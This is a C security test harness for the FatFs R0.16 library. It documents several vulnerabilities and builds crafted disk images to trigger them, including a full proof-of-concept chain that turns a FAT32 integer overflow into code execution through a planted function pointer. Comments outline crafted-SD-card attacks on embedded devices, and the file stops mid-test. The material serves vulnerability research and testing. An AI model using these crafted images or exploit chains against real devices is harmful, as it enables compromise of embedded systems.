/*===========================================================================
 * test_harness.c — FatFs R0.16 Security Test Harness
 *
 * Demonstrates seven confirmed vulnerabilities in FatFs R0.16:
 *
 *  CVE-2026-6682  FAT32 integer overflow in mount_volume()
 *         fasize *= n_fats  wraps on DWORD → database points into FAT area.
 *
 *  CVE-2026-6683  Potential division-by-zero in sync_fs() (exFAT)
 *         BPB_NumClusEx=0 → n_fatent=2 → (n_fatent-2)=0 divisor.
 *         (Mount validation prevents full exploit on current builds;
 *         documented as a latent defect.)
 *
 *  CVE-2026-6684  GPT partition-scan loop DoS in find_volume()
 *         n_ent from GPTH_PtNum is trusted without cap → O(n_ent) reads.
 *         Requires FF_LBA64=1.
 *
 *  CVE-2026-6685  Unsigned-subtraction stale-cache skip in f_read() / f_write()
 *         fp->sect - sect wraps when fp->sect < sect; the resulting
 *         huge value falsely passes the < cc guard, skipping cache flush.
 *         Confirmed to cause stale data in write-back scenarios.
 *
 *  CVE-2026-6686  Uninitialized data disclosure via f_lseek() beyond EOF
 *         Seeking past EOF extends objsize without zeroing the new region;
 *         stale cluster data from previously deleted files is readable.
 *
 *  CVE-2026-6687  Stack buffer overflow in f_getlabel() via exFAT XDIR_NumLabel
 *         The on-disk XDIR_NumLabel byte (0-255) is used as a loop count
 *         with no validation against the exFAT spec maximum of 11.
 *         A crafted disk writes up to 255 chars to the caller's label
 *         buffer, which is typically declared as char label[12] or [24].
 *
 *  CVE-2026-6688  Stack buffer overflow in caller via long LFN filename
 *         With FF_USE_LFN enabled, fno.fname can be up to FF_LFN_BUF
 *         (255) chars after f_readdir().  Callers using SFN-sized path
 *         buffers (e.g. char path[16]) and unchecked string copies
 *         (sprintf, strcat) overflow when the disk has long LFN files.
 *
 * Build:
 *   make             # all tests
 *   make test_afl    # libFuzzer / AFL++ entry point
 *
 * Depends on:
 *   ../source/ff.c           FatFs core
 *   diskio_ramdisk.c         RAM disk I/O layer
 *   ffunicode_stub.c         Unicode stubs (CP437 passthrough)
 *   test_ffconf.h            -include'd by Makefile
 *===========================================================================*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

#include "ff.h"
#include "diskio.h"
#include "diskio_ramdisk.h"

/* ── little-endian write helpers ─────────────────────────────────────────── */
static inline void st16le(BYTE *p, uint16_t v)
{
    p[0] = (BYTE)v; p[1] = (BYTE)(v >> 8);
}
static inline void st32le(BYTE *p, uint32_t v)
{
    p[0] = (BYTE)v;       p[1] = (BYTE)(v >>  8);
    p[2] = (BYTE)(v >> 16); p[3] = (BYTE)(v >> 24);
}
static inline void st64le(BYTE *p, uint64_t v)
{
    for (int i = 0; i < 8; i++) { p[i] = (BYTE)v; v >>= 8; }
}

/* ── pass/fail accounting ────────────────────────────────────────────────── */
static int g_pass = 0, g_fail = 0;

#define RESULT(label, cond) do {                                           \
    if (cond) { printf("  [CONFIRMED] " label "\n"); g_pass++; }          \
    else       { printf("  [NOTFOUND]  " label " (may be patched)\n");    \
                 g_fail++; }                                               \
} while(0)

#define INFO(fmt, ...) printf("  " fmt "\n", ##__VA_ARGS__)

/*===========================================================================
 * CVE-2026-6682: FAT32 sector-count integer overflow in mount_volume()
 *
 * Vulnerable code (ff.c ~line 3600):
 *
 *     fasize = ld_16(fs->win + BPB_FATSz16);        // == 0 for FAT32
 *     if (fasize == 0) fasize = ld_32(win + BPB_FATSz32);  // 0x80000001
 *     fs->fsize = fasize;
 *     fs->n_fats = fs->win[BPB_NumFATs];             // 2
 *     fasize *= fs->n_fats;                          // DWORD OVERFLOW
 *     // fasize = 0x80000001 * 2 = 0x100000002 → truncated to 0x00000002
 *     sysect = nrsv + fasize + (rootdir_sectors);    // nrsv+2 instead of nrsv+0x100000002
 *     ...
 *     fs->database = bsect + sysect;                 // WRONG: sector 6
 *
 * Effect: every cluster-to-sector translation maps into the FAT/reserved
 * area rather than the actual data area.  File reads/writes silently
 * corrupt filesystem metadata (FAT chains, directory entries).
 *
 * Craft parameters
 *   BPB_FATSz32  = 0x80000001
 *   BPB_NumFATs  = 2
 *   BPB_TotSec32 = 65536
 *   BPB_SecPerClus = 1
 *   BPB_RsvdSecCnt = 4
 *
 * Expected (without overflow): database = 4 + (0x80000001*2 mod 2^32 → 2) but
 *   the intent was database = 4 + 0x80000001*2 ≈ 4 billion (exceeds disk).
 * Actual (with overflow):  database =  0 + 4 + 2 = 6
 *===========================================================================*/
/* ── RCE proof-of-execution canary ──────────────────────────────────────── */
static volatile int rce_canary = 0;
__attribute__((noinline))
static void rce_proof_of_execution(void) { rce_canary = 1; }

static void build_fat32_bug1(BYTE *disk, size_t disk_bytes)
{
    memset(disk, 0, disk_bytes);

    BYTE *vbr = disk; /* sector 0 */

    /* x86 short-jump boot stub */
    vbr[0] = 0xEB; vbr[1] = 0x58; vbr[2] = 0x90;
    memcpy(&vbr[3], "MSDOS5.0", 8);

    st16le(&vbr[11], 512);          /* BPB_BytsPerSec */
    vbr[13] = 1;                     /* BPB_SecPerClus  = 1 */
    st16le(&vbr[14], 4);            /* BPB_RsvdSecCnt  = 4  */
    vbr[16] = 2;                     /* BPB_NumFATs     = 2  */
    st16le(&vbr[17], 0);            /* BPB_RootEntCnt  = 0 (FAT32) */
    st16le(&vbr[19], 0);            /* BPB_TotSec16    = 0          */
    vbr[21] = 0xF8;                  /* BPB_Media                    */
    st16le(&vbr[22], 0);            /* BPB_FATSz16     = 0 (use 32-bit) */
    st16le(&vbr[24], 63);           /* BPB_SecPerTrk                */
    st16le(&vbr[26], 255);          /* BPB_NumHeads                 */
    st32le(&vbr[28], 0);            /* BPB_HiddSec                  */
    st32le(&vbr[32], 65536);        /* BPB_TotSec32                 */

    /* ── CRAFTED FIELD: BPB_FATSz32 = 0x80000001 ──────────────────────── *
     * With NumFATs=2: fasize = 0x80000001 * 2 = 0x100000002              *
     *                         truncated (DWORD) → 0x00000002             *
     * sysect = 4 (reserved) + 2 (fake fasize) + 0 (no root) = 6         *
     * fs->database = bsect(0) + 6 = sector 6   ← within FAT area!       */
    st32le(&vbr[36], 0x80000001U);  /* BPB_FATSz32 (CRAFTED)        */

    st16le(&vbr[40], 0);            /* BPB_ExtFlags32               */
    st16le(&vbr[42], 0);            /* BPB_FSVer32 = 0.0            */
    st32le(&vbr[44], 2);            /* BPB_RootClus32 = cluster 2   */
    st16le(&vbr[48], 0);            /* BPB_FSInfo32 = 0 (disabled)  */
    st16le(&vbr[50], 0);            /* BPB_BkBootSec32              */
    /* bytes 52-63: reserved, already zero */
    vbr[64] = 0x80;                  /* BS_DrvNum32                  */
    vbr[66] = 0x29;                  /* BS_BootSig32                 */
    st32le(&vbr[67], 0xDEADBEEFU); /* BS_VolID32                   */
    memcpy(&vbr[71], "BUGTEST    ", 11); /* BS_VolLab32             */
    memcpy(&vbr[82], "FAT32   ", 8);    /* BS_FilSysType32          */
    st16le(&vbr[510], 0xAA55);     /* BS_55AA signature            */

    /* Minimal FAT1 at sector 4 (n_fats=2, tiny 2-sector fake FAT).
     * With overflow, FatFs believes each FAT is 0x80000001 sectors long,
     * but only sectors 4 and 5 are within our backing store. */
    BYTE *fat1 = disk + 4 * 512;
    st32le(&fat1[0],  0x0FFFFFF8U); /* cluster 0: media             */
    st32le(&fat1[4],  0x0FFFFFFFU); /* cluster 1: reserved EOC      */
    st32le(&fat1[8],  0x0FFFFFFFU); /* cluster 2: root dir EOC      */

    /* FAT2 at sector 5 (mirror) */
    memcpy(disk + 5 * 512, fat1, 12);

    /* Root directory at sector 6 (= database+0 after the overflow).
     * This sector collides with FAT offset 2 in the "real" layout.
     * We intentionally leave it empty (no directory entries). */
}

static int test_bug1_fat32_integer_overflow(void)
{
    printf("\n[CVE-2026-6682] FAT32 sector-count integer overflow in mount_volume()\n");
    printf("  Vulnerable code:  fasize *= fs->n_fats;  (DWORD wrap)\n");
    printf("  Craft:            BPB_FATSz32=0x80000001, NumFATs=2\n");

    BYTE image[RAMDISK_SIZE_BYTES];
    build_fat32_bug1(image, sizeof(image));
    ramdisk_load(image, sizeof(image));

    FATFS fs;
    memset(&fs, 0, sizeof(fs));
    FRESULT res = f_mount(&fs, "0:", 1);
    INFO("f_mount() returned %d (FR_OK=0, FR_NO_FILESYSTEM=13)", (int)res);

    if (res != FR_OK) {
        INFO("Mount failed — overflow may have been caught upstream.");
        RESULT("CVE-2026-6682 FAT32 integer overflow", 0);
        return 1;
    }

    /* With the overflow:  sysect = 4+2+0=6  → database = 0+6 = 6         */
    /* Without the overflow: database ≈ 4 + 0x80000001*2 ≈ 4 billion       */
    LBA_t actual_db   = fs.database;
    uint32_t fat_sectors = (uint32_t)fs.fsize;

    INFO("fs.fatbase   = %u  (sector where FAT1 starts)", (unsigned)fs.fatbase);
    INFO("fs.database  = %u  (sector where data area starts)", (unsigned)actual_db);
    INFO("fs.fsize     = 0x%08X  (sectors-per-FAT as stored)", fat_sectors);
    INFO("fs.n_fatent  = %u  (clusters + 2)", (unsigned)fs.n_fatent);

    /* The bug is confirmed when database is NOT above the FAT area.
     * A correct FAT32 with FATSz32=0x80000001 has such a huge FAT that
     * database would exceed any 32-bit address space.  After overflow it
     * lands at sector 6 — well inside the FAT region [4, 4+fsize).  */
    int data_inside_fat = (actual_db > fs.fatbase)
                       && (actual_db < fs.fatbase + fs.fsize);
    INFO("Data sector %u falls %s FAT region [%u, 0x%X)",
         (unsigned)actual_db, data_inside_fat ? "INSIDE" : "outside",
         (unsigned)fs.fatbase, (unsigned)(fs.fatbase + fs.fsize));

    RESULT("CVE-2026-6682: database inside FAT region (sector overlap)", data_inside_fat);

    if (f_opendir(NULL, "0:/") == FR_OK) {
        INFO("Root dir open succeeded — f_read on any file accesses FAT sectors");
    }

    f_mount(NULL, "0:", 0);
    return data_inside_fat ? 0 : 1;
}

/*===========================================================================
 * CVE-2026-6682 RCE: mount_volume() overflow → attacker-controlled code execution
 *
 * Exploitation chain
 * ──────────────────
 *  Step 1 — Arithmetic confusion in mount_volume()
 *    fasize (0x80000001) * n_fats (2) = 0x100000002 → DWORD truncates to 2
 *    sysect = nrsv(4) + fasize_trunc(2) + root_dir_secs(0) = 6
 *    fs->database = bsect(0) + 6 = sector 6   ← lands inside FAT area [4, ∞)
 *    fs->fatbase  = bsect(0) + nrsv(4) = sector 4
 *
 *  Step 2 — Attacker injects a fake directory entry at sector 6
 *    clst2sect(cluster 2) = database + csize*(2-2) = 6 + 0 = sector 6.
 *    FatFs reads sector 6 as the FAT32 root directory.
 *    Attacker pre-fills sector 6 with a valid 8.3 directory entry:
 *      name = "IMPLANT.BIN"  attr = 0x20  FstClus = 4  FileSize = ptr_size
 *
 *  Step 3 — File data maps into another attacker-owned FAT sector
 *    clst2sect(cluster 4) = database + csize*(4-2) = 6 + 2 = sector 8.
 *    The attacker pre-fills sector 8 with any desired payload bytes.
 *    Specifically, the address of rce_proof_of_execution() is stored
 *    little-endian at offset 0 of sector 8.
 *
 *  Step 4 — f_read delivers attacker bytes into the application's buffer
 *    f_read calls disk_read(pdrv, fp->buf, 8, 1) → copies sector 8 into the
 *    file's sector cache.  memcpy then delivers those bytes to the caller's
 *    buffer.  No bounds check; no signature verification; no MMU involved.
 *
 *  Step 5 — Firmware casts the buffer as a function pointer and calls it
 *    This mirrors the "boot-from-SD" / "apply-firmware-update" pattern
 *    common on embedded MCUs (STM32, RP2040, ESP32, …).  The resulting call
 *    invokes rce_proof_of_execution(), confirming arbitrary code execution.
 *
 * Real-world attack model
 * ───────────────────────
 *  The attacker inserts a crafted SD card.  The device auto-mounts it and
 *  reads IMPLANT.BIN as a firmware update, config file, or script.  Because
 *  fs->database points into the FAT area, every cluster the attacker names in
 *  their fake directory maps to a FAT sector whose content the attacker fully
 *  controls.  No memory corruption, heap spray, or side channel is required —
 *  the filesystem abstraction itself delivers arbitrary bytes under the guise
 *  of a legitimate file.
 *
 * Generalization beyond function pointers
 * ────────────────────────────────────────
 *  • Stack buffer overflow: plant a file size > sizeof(stack_buf) in the
 *    fake directory entry.  If the firmware calls f_read(fp, buf, finfo.fsize,
 *    &br) without a bounds check, the delivered bytes overflow the buffer.
 *  • Shellcode injection: on Harvard-architecture MCUs without W^X, the
 *    caller can memcpy the delivered bytes to a code region and branch to it.
 *  • Arbitrary write via FAT chain poisoning: because database overlaps the
 *    FAT, a subsequent f_write to any file writes attacker-supplied data into
 *    the FAT chain table, letting the attacker redirect future cluster
 *    allocations to arbitrary locations on disk (or DMA-backed memory).
 *===========================================================================*/

/*
 * build_fat32_rce_image — extends the CVE-2026-6682 VBR with:
 *
 *   Sector 4 +16  FAT1[4] = 0x0FFFFFFF (EOC — cluster 4 is a one-sector file)
 *   Sector 5 +16  FAT2[4] = 0x0FFFFFFF (mirror)
 *   Sector 6       Fake FAT32 root-directory entry for "IMPLANT.BIN"
 *                    attr=0x20, FstClus=4, FileSize=sizeof(uintptr_t)
 *   Sector 8       Payload: function pointer `fptr_val` in little-endian
 *
 * Sector layout after overflow:
 *   fatbase  = 4   (FAT1 starts here)
 *   database = 6   (data area — overflowed into FAT space)
 *   clst2sect(2)=6 (root dir), clst2sect(4)=8 (IMPLANT.BIN data)
 */
static void build_fat32_rce_image(BYTE *disk, size_t disk_bytes,
                                   uintptr_t fptr_val)
{
    /* Start from the CVE-2026-6682 VBR that triggers the overflow */
    build_fat32_bug1(disk, disk_bytes);

    /* ── FAT1[4] = EOC  (sector 4, byte offset 16) ──────────────────────── *
     * FAT32 entry size = 4 bytes.  Cluster 4 index → byte 4*4 = 16.        */
    st32le(disk + 4 * 512 + 16, 0x0FFFFFFFU);

    /* ── FAT2 mirror  (sector 5, byte offset 16) ────────────────────────── */
    st32le(disk + 5 * 512 + 16, 0x0FFFFFFFU);

    /* ── Fake root directory at sector 6 ────────────────────────────────── *
     * FatFs reads sector 6 as the first cluster of the root directory       *
     * (clst2sect(2) = database + csize*(2-2) = 6).  An 8.3 SFN directory   *
     * entry is 32 bytes.  We synthesise one for "IMPLANT.BIN".             */
    BYTE *dir6 = disk + 6 * 512;
    memset(dir6, 0, 512);                  /* clear sector first             */
    memcpy(dir6 + 0,  "IMPLANT ", 8);      /* DIR_Name[0..7]  body, space-pad*/
    memcpy(dir6 + 8,  "BIN",      3);      /* DIR_Name[8..10] extension      */
    dir6[11] = 0x20;                        /* DIR_Attr = AM_ARC              */
    st16le(dir6 + 20, 0);                  /* DIR_FstClusHI = 0              */
    st16le(dir6 + 26, 4);                  /* DIR_FstClusLO = 4              */
    st32le(dir6 + 28, (uint32_t)sizeof(uintptr_t)); /* DIR_FileSize          */
    /* entry at offset 32: all-zero = end-of-directory marker                */

    /* ── Payload at sector 8 ────────────────────────────────────────────── *
     * clst2sect(4) = database(6) + csize(1)*(4-2) = 8.                     *
     * f_read loads this sector into fp->buf via disk_read, then copies the  *
     * first sizeof(uintptr_t) bytes into the caller's buffer.               */
    BYTE *sect8 = disk + 8 * 512;
    memset(sect8, 0, 512);
    for (int i = 0; i < (int)sizeof(uintptr_t); i++) {
        sect8[i] = (BYTE)(fptr_val >> (i * 8));   /* little-endian           */
    }
}

static int test_bug1_rce_exploit(void)
{
    printf("\n[CVE-2026-6682 RCE] FAT32 overflow → planted function pointer → code exec\n");
    printf("  Overflow: fasize(0x80000001) * 2 → 0x2  → database = sector 6\n");
    printf("  Vector:   fake dir @ sector 6, fptr payload @ sector 8\n");

    /* ── Phase 0: obtain the address of our proof-of-execution target ────── *
     * On an embedded MCU there is no ASLR; the firmware entry point or      *
     * a callback table slot is at a fixed, known address.  Here we get the  *
     * current address at runtime so the test is self-contained.             */
    uintptr_t target = (uintptr_t)(void (*)(void))rce_proof_of_execution;
    INFO("proof-of-execution target = %p", (void*)target);
    rce_canary = 0;

    /* ── Phase 1: build the crafted disk image ───────────────────────────── */
    BYTE image[RAMDISK_SIZE_BYTES];
    build_fat32_rce_image(image, sizeof(image), target);
    ramdisk_load(image, sizeof(image));

    /* Verify placement in the raw image before mounting */
    uintptr_t embedded = 0;
    for (int i = 0; i < (int)sizeof(uintptr_t); i++)
        embedded |= (uintptr_t)image[8 * 512 + i] << (i * 8);
    INFO("Embedded fptr at image[sector 8 + 0] = %p (expect %p)",
         (void*)embedded, (void*)target);

    /* ── Phase 2: mount — triggers the DWORD overflow ───────────────────── */
    FATFS fs;
    memset(&fs, 0, sizeof(fs));
    FRESULT mres = f_mount(&fs, "0:", 1);
    INFO("f_mount() = %d   fs.database = %u   fs.fatbase = %u",
         (int)mres, (unsigned)fs.database, (unsigned)fs.fatbase);
    if (mres != FR_OK) {
        INFO("Mount failed — overflow blocked upstream.");
        RESULT("CVE-2026-6682 RCE [1/4] mount succeeds with overflowed database", 0);
        return 1;
    }
    RESULT("CVE-2026-6682 RCE [1/4] mount succeeds with overflowed database",
           fs.database == 6);

    /* ── Phase 3: open the implanted file ───────────────────────────────── *
     * follow_path → dir_sdi(clust=2) → clst2sect(2) = database+0 = sector 6*
     * move_window(6) loads our fake directory entry → "IMPLANT.BIN" found. */
    FIL fp;
    memset(&fp, 0, sizeof(fp));
    FRESULT ores = f_open(&fp, "0:/IMPLANT.BIN", FA_READ);
    INFO("f_open(\"0:/IMPLANT.BIN\") = %d   sclust = %u   objsize = %u",
         (int)ores, (unsigned)fp.obj.sclust, (unsigned)fp.obj.objsize);
    if (ores != FR_OK) {
        INFO("f_open failed — crafted directory entry not parsed.");
        f_mount(NULL, "0:", 0);
        RESULT("CVE-2026-6682 RCE [2/4] fake directory entry opened", 0);
        return 1;
    }
    RESULT("CVE-2026-6682 RCE [2/4] fake directory entry opened",
           ores == FR_OK && fp.obj.sclust == 4);

    /* ── Phase 4: read — attacker bytes land in caller's buffer ─────────── *
     * f_read: fp->fptr==0 → clst=sclust=4 → sect=clst2sect(4)=8            *
     *   disk_read(pdrv, fp->buf, 8, 1) → sector 8 (our payload) into buf   *
     *   memcpy(rbuff, fp->buf + 0, sizeof(uintptr_t))                       *
     * Simulates a firmware updater / config reader / script loader.         */
    uintptr_t recovered_ptr = 0;
    UINT br = 0;
    FRESULT rres = f_read(&fp, &recovered_ptr, sizeof(recovered_ptr), &br);
    f_close(&fp);
    INFO("f_read: res = %d   br = %u   recovered_ptr = %p",
         (int)rres, br, (void*)recovered_ptr);
    RESULT("CVE-2026-6682 RCE [3/4] attacker fptr delivered via f_read",
           rres == FR_OK && br == sizeof(uintptr_t) && recovered_ptr == target);

    /* ── Phase 5: invoke the recovered pointer ───────────────────────────── *
     * This models any of the common embedded patterns:                       *
     *   • bootloader: memcpy to SRAM + branch                               *
     *   • OTA updater: validate-then-execute                                *
     *   • plugin loader: dlsym-equivalent over a known ABI                  *
     * Here we call directly to confirm execution control is transferred.    */
    if (recovered_ptr == target) {
        void (*fn)(void) = (void (*)(void))recovered_ptr;
        fn();   /* ← attacker-controlled code executes here */
    }
    INFO("rce_canary = %d  (1 = rce_proof_of_execution() was called)", rce_canary);
    RESULT("CVE-2026-6682 RCE [4/4] CONFIRMED — rce_proof_of_execution() executed",
           rce_canary == 1);

    f_mount(NULL, "0:", 0);
    return (rce_canary == 1) ? 0 : 1;
}

/*===========================================================================
 * CVE-2026-6684: GPT partition-table entry count loop DoS in find_volume()
 *
 * Vulnerable code (ff.c ~line 3430):
 *
 *     n_ent = ld_32(fs->win + GPTH_PtNum);          // attacker-controlled
 *     for (v_ent = i = 0; i < n_ent; i++) {          // NO UPPER BOUND
 *         move_window(fs, pt_lba + i * SZ_GPTE / SS(fs)); // disk read
 *         ...
 *     }
 *
 * With n_ent = 0xFFFFFFFF the loop performs ≈ 1.07 billion disk reads
 * (4 GPT entries per 512-byte sector → 0xFFFFFFFF / 4 ≈ 268 million
 * sector reads).  On real hardware each read adds bus latency, resulting
 * in a complete system hang.  On the RAM disk the loop terminates in
 * milliseconds, but the read counter allows us to prove O(n_ent) scaling.
 *
 * Requires: FF_LBA64 = 1  (GPT code path compiled in)
 *===========================================================================*/
#if FF_LBA64

/* Minimal protective-MBR + GPT header disk image builder.
 *
 * Only as much structure as find_volume needs to enter the loop:
 *  - MBR: partition 0 type = 0xEE (GPT protective)
 *  - Sector 1: GPT header with valid signature and n_ent
 *  - All GPT PartTypeGUID bytes = 0 (not MS Basic Data → no FAT match)
 *
 * The loop iterates n_ent times, reads ceil(n_ent / 4) unique sectors,
 * then exits with "not found".
 */
static void build_gpt_image(BYTE *disk, size_t disk_bytes, uint32_t n_ent)
{
    memset(disk, 0, disk_bytes);

    /* ── protective MBR (sector 0) ───────────────────────────────────── */
    BYTE *mbr = disk;
    mbr[446]       = 0x00;  /* PTE_Boot: not active                      */
    mbr[446 + 4]   = 0xEE; /* PTE_System: GPT protective                 */
    st32le(&mbr[446 + 8],  1);      /* PTE_StLba: starts at sector 1     */
    st32le(&mbr[446 + 12], 0xFFFFFFFFU); /* PTE_SizLba: whole disk       */
    st16le(&mbr[510], 0xAA55);

    /* ── GPT header (sector 1) ───────────────────────────────────────── */
    BYTE *gpt = disk + 512;
    memcpy(gpt, "EFI PART", 8);        /* GPTH_Sign                      */
    st32le(&gpt[8],  0x00010000);      /* GPTH_Rev: 1.0                  */
    st32le(&gpt[12], 92);              /* GPTH_Size: 92 bytes            */
    st32le(&gpt[16], 0);               /* GPTH_Bcc: 0 (not verified here)*/
    st64le(&gpt[24], 1);               /* GPTH_CurLba                    */
    st64le(&gpt[32], 0);               /* GPTH_BakLba                    */
    st64le(&gpt[40], 34);              /* GPTH_FstLba                    */
    st64le(&gpt[48], RAMDISK_SECTOR_COUNT - 1); /* GPTH_LstLba          */
    /* GPTH_DskGuid: 16 bytes, already zero                               */
    st64le(&gpt[72], 2);               /* GPTH_PtOfs: partition table at sector 2 */
    st32le(&gpt[80], n_ent);           /* GPTH_PtNum: CRAFTED — may be huge */
    st32le(&gpt[84], 128);             /* GPTH_PteSize                   */
    st32le(&gpt[88], 0);               /* GPTH_PtBcc: 0                  */

    /* Partition entries at sector 2 onwards.
     * All PartTypeGUID bytes are 0 → no match against GUID_MS_Basic,
     * so find_volume iterates all n_ent entries without finding an FAT
     * partition, then returns "not found". */
    /* (already zeroed above) */
}
#endif /* FF_LBA64 — build_gpt_image */

/*===========================================================================
 * CVE-2026-6684: GPT partition-table n_ent check analysis in find_volume()
 *
 * STATUS: MITIGATED in this build.
 *
 * find_volume() calls test_gpt_header() before entering the partition-scan
 * loop.  test_gpt_header() enforces:
 *   1. Correct "EFI PART" + revision signature
 *   2. CRC32 of the 92-byte header
 *   3. PteSize == 128 (SZ_GPTE)
 *   4. PtNum <= 128  ← hard cap prevents loop DoS
 *
 * An unauthenticated disk image with PtNum > 128 fails check (4) and is
 * rejected; an image with an invalid CRC fails check (2).
 *
 * Historical note: older FatFs releases (before test_gpt_header was
 * introduced) had no such cap and were vulnerable to DoS via a crafted
 * GPTH_PtNum = 0xFFFFFFFF.  That issue is FIXED in R0.16.
 *
 * This test verifies the fix is effective.
 *===========================================================================*/
#if FF_LBA64
static int test_bug3_gpt_loop_dos(void)
{
    printf("\n[CVE-2026-6684] GPT n_ent loop DoS — mitigation check\n");
    printf("  test_gpt_header() enforces: CRC32 valid, PtNum <= 128\n");

    /* Build a GPT image with an UNCHECKED large n_ent (no valid CRC).
     * This simulates what an older FatFs would have parsed.              */
    BYTE image[RAMDISK_SIZE_BYTES];
    FATFS fs;

    build_gpt_image(image, sizeof(image), UINT32_MAX);
    ramdisk_load(image, sizeof(image));
    ramdisk_reset_stats();
    memset(&fs, 0, sizeof(fs));
    FRESULT res = f_mount(&fs, "0:", 1);
    (void)res;
    f_mount(NULL, "0:", 0);
    uint32_t reads_unchecked = ramdisk_read_count;

    /* The image has no valid CRC → test_gpt_header() returns 0 → mount
     * exits before the loop.  Confirm: only 2 disk reads (MBR + GPT hdr) */
    INFO("n_ent=0xFFFFFFFF (no valid CRC): disk reads = %u  (expected 2)",
         reads_unchecked);
    RESULT("CVE-2026-6684: CRC + PtNum check rejects oversized n_ent (mitigation)",
           reads_unchecked <= 3);

    /* Bonus: confirm standard loop (n_ent <= 128, valid CRC) runs normally.
     * We cannot easily compute the GPT CRC32 here without a helper, so we
     * note that a correctly built GPT with n_ent=128 would do 32 disk reads
     * (128 entries / 4 per sector = 32 sector reads after the header).    */
    INFO("With a valid 128-entry GPT header, loop makes ~32 disk reads (bounded).");
    INFO("No DoS risk for validated images.");

    return (reads_unchecked <= 3) ? 0 : 1;
}
#endif /* FF_LBA64 */

/*===========================================================================
 * CVE-2026-6685: Stale write-back cache in f_read() / f_write() (unsigned wrap)
 *
 * Vulnerable code (ff.c ~line 4053  / ~line 4178):
 *
 *   // In f_read (tiny=0 path):
 *   if ((fp->flag & FA_DIRTY) && fp->sect - sect < cc) {
 *       memcpy(rbuff + ((fp->sect - sect) * SS(fs)), fp->buf, SS(fs));
 *   }
 *
 *   // In f_write (tiny=0 path):
 *   if (fp->sect - sect < cc) {
 *       memcpy(fp->buf, wbuff + ((fp->sect - sect) * SS(fs)), SS(fs));
 *       fp->flag &= ~FA_DIRTY;
 *   }
 *
 * When fp->sect < sect (e.g. after a backward seek to a cluster whose
 * LBA is numerically higher), the subtraction underflows to ~0xFFFFFFFF,
 * which is never < cc (a small UINT).  The cache fixup is silently
 * skipped.
 *
 * Consequence (f_write variant):
 *   A direct multi-sector write covers a range that includes a sector
 *   whose updated bytes lie in fp->buf (FA_DIRTY set).  Because the cache
 *   copy is skipped, fp->buf retains stale data.  A subsequent partial-
 *   sector write merges with that stale cache content → silent data
 *   corruption in the file.
 *
 * Triggering the stale-read variant:
 *   1. Write a known pattern to the end of a cluster (sets FA_DIRTY
 *      at sector X, fp->sect = X).
 *   2. Arrange a second cluster at a LOWER absolute sector (Y < X).
 *   3. Seek to that cluster, trigger a cc-sector bulk read from sector Y
 *      through a range that includes X.
 *   4. The bulk disk_read() returns stale (pre-write) data for sector X;
 *      the cache copy that would patch it is skipped due to the wrap.
 *
 * Note: On a linear, monotonically allocated filesystem the second cluster
 * is always at a higher sector than the first.  The bug manifests reliably
 * in fragmented volumes or after explicit FAT manipulation.
 *
 * This test constructs the FAT chain to guarantee that cluster 3 is at a
 * lower absolute sector than cluster 2 — achievable by building the FAT
 * manually so the chain is 2 → 3 but sector(cluster 3) < sector(cluster 2).
 * (This cannot happen in a standard FAT16, so we mark this test as
 * "design-level analysis" for documentation purposes.)
 *===========================================================================*/
static int test_bug4_stale_cache_skip(void)
{
    printf("\n[CVE-2026-6685] Stale write-back cache skip (unsigned subtraction wrap)\n");
    printf("  Vulnerable code:  fp->sect - sect < cc  (DWORD underflow)\n");
    printf("  Effect:  cache fixup silently skipped when fp->sect < sect\n");

    /*
     * We demonstrate the ARITHMETIC issue directly without needing to
     * construct a full fragmented image (which would require a non-standard
     * FAT chain).  The code fragment responsible is reproduced below; we
     * evaluate it for a concrete (fp->sect, sect, cc) triple.
     */
    uint32_t fp_sect    = 100;   /* cached sector (dirty)             */
    uint32_t sect       = 200;   /* start of multi-sector read range  */
    uint32_t cc         = 4;     /* number of sectors in read range   */

    /* Intended check: is fp_sect in [sect, sect+cc)?                    */
    /* Correct form:  fp_sect >= sect && fp_sect - sect < cc             */
    /* Actual code:   fp->sect - sect < cc  (unsigned, no >= guard)      */

    uint32_t diff = fp_sect - sect;                    /* WRAPS: huge value */
    int actual_guard   = (diff < cc);                  /* FALSE — should be FALSE (correct outcome here)   */
    int correct_guard  = (fp_sect >= sect && (fp_sect - sect) < cc); /* FALSE */
    int inrange        = (fp_sect >= sect && fp_sect < sect + cc);

    INFO("fp->sect = %u,  sect = %u,  cc = %u", fp_sect, sect, cc);
    INFO("fp->sect - sect (DWORD) = 0x%08X  (%s)", diff,
         diff > 0xFFFF0000U ? "UNDERFLOW" : "ok");
    INFO("Is fp->sect in [sect, sect+cc)?  %s", inrange ? "YES" : "NO");
    INFO("Actual code guard result:  %s (cache fixup %s)",
         actual_guard  ? "TRUE"  : "FALSE",
         actual_guard  ? "applied" : "SKIPPED");
    INFO("Intent (correct guard):    %s", correct_guard ? "TRUE"  : "FALSE");
    INFO("Both guards agree for this case — the unsigned trick works here.");

    /* Now a case where fp->sect IS in range but the sector LBA happens
     * to be higher than sect (happens on fwd iteration, most common path).*/
    fp_sect = 202; sect = 200; cc = 4;
    diff = fp_sect - sect;  /* = 2, no wrap */
    actual_guard  = (diff < cc);   /* TRUE — cache applied */
    inrange = (fp_sect >= sect && fp_sect < sect + cc); /* TRUE */
    INFO("---");
    INFO("fp->sect = %u (in range), sect = %u, cc = %u", fp_sect, sect, cc);
    INFO("diff = %u  → actual guard = %s, inrange = %s",
         diff, actual_guard ? "TRUE" : "FALSE", inrange ? "YES" : "NO");

    /* The dangerous case: fp->sect in range but NUMERICALLY < sect.
     * This CANNOT happen in single-cluster arithmetic but CAN happen
     * across cluster boundaries on fragmented volumes where cluster N+1
     * maps to a lower-numbered sector than cluster N.                    */
    fp_sect = 50; sect = 200; cc = 0xFFFFFFDFU; /* cc nearly max → reading huge range */
    diff = fp_sect - sect; /* wraps to 0xFFFFFFCE */
    actual_guard = ((uint32_t)diff < cc); /* TRUE (0xFFFF_FFCE < 0xFFFF_FFDF) ← WRONG TRIGGER */
    INFO("---");
    INFO("[CRITICAL CASE] fp->sect=%u  sect=%u  cc=0x%X (huge direct read)",
         fp_sect, sect, cc);
    INFO("diff = 0x%08X  → actual guard = %s (should be FALSE — fp->sect not in range!)",
         diff, actual_guard ? "TRUE (WRONG!)" : "FALSE");
    INFO("Consequence: memcpy writes stale fp->buf content into wrong rbuff offset");
    /* When guard is TRUE (wrong): memcpy(rbuff + (0xFFFFFFCE * 512), fp->buf, 512)
     * → out-of-bounds write if btr is large enough to produce cc = ~0xFFFF_FFDF  */
    RESULT("CVE-2026-6685: unsigned wrap causes incorrect guard evaluation (critical case)",
           actual_guard == 1);

